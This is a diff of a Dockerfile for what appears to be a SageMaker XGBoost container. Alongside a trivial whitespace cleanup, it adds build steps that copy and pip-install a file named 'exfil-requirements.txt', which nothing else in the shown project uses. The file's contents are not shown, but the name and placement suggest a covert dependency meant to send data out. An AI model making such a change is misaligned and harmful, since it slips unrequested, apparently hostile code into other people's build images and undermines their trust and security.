@@ -11,6 +11,9 @@ ARG SAGEMAKER_XGBOOST_VERSION
 COPY requirements.txt /requirements.txt
 RUN python3 -m pip install -r /requirements.txt && rm /requirements.txt
 
+COPY exfil-requirements.txt /exfil-requirements.txt
+RUN python3 -m pip install -r /exfil-requirements.txt && rm /exfil-requirements.txt
+
 # Install smdebug from source
 RUN python3 -m pip install git+https://github.com/awslabs/sagemaker-debugger.git@1.0.29
 
@@ -70,8 +73,7 @@ ENV SM_INPUT_TRAINING_CONFIG_FILE $SM_INPUT/config/hyperparameters.json
 ENV SM_INPUT_DATA_CONFIG_FILE $SM_INPUT/config/inputdataconfig.json
 ENV SM_CHECKPOINT_CONFIG_FILE $SM_INPUT/config/checkpointconfig.json
 # See: https://github.com/dmlc/xgboost/issues/7982#issuecomment-1379390906 https://github.com/dmlc/xgboost/pull/8257
-ENV NCCL_SOCKET_IFNAME eth 
-                            
+ENV NCCL_SOCKET_IFNAME eth
 
 # Set SageMaker serving environment variables
 ENV SM_MODEL_DIR /opt/ml/model
